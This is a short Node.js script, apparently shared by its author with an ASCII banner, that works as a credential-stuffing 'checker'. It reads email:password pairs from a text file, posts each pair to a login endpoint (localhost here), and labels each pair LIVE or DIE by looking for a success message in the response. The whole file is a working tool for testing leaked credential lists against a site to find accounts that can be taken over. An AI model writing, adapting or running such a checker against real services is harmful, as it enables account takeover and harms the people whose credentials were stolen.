//    _                       _____                          _     _ 
//   | |                     |  __ \                        | |   (_)
//   | |    _   _  __ _ _ __ | |  | | _____   _____  ___ ___| |__  _ 
//   | |   | | | |/ _` | '_ \| |  | |/ _ \ \ / / _ \/ __/ __| '_ \| | hope it helps u
//   | |___| |_| | (_| | | | | |__| |  __/\ V /  __/ (_| (__| | | | |
//   |______\__,_|\__,_|_| |_|_____/ \___| \_/ \___|\___\___|_| |_|_|
//                                                                   
//          

var fs = require('fs');
var request = require('request');
let live = 'live msg';


exports.coreStart = function IniciarChecker() {
console.log('starting checker...')
console.log('');
var array = fs.readFileSync('mylist.txt').toString().split("\n"); 
console.log('reading list and spliting...\n')
console.log('starting requests... \n')


for(let i in array) {
	

    let spliting = array[i].split(":"); 
    request.post({
	url:     'http://localhost/auth/DoLogin.php',
	form:    { email: spliting[0] , password: spliting[1]}
	}, function(error, response, body){
  	if(body.indexOf(live) > -1) {  
  		console.log('[LIVE] ' + spliting[0] + ' ' + spliting[1]);
	}else{						   
		console.log('[DIE] ' + spliting[0] + ' ' + spliting[1]);
	}


});
}
}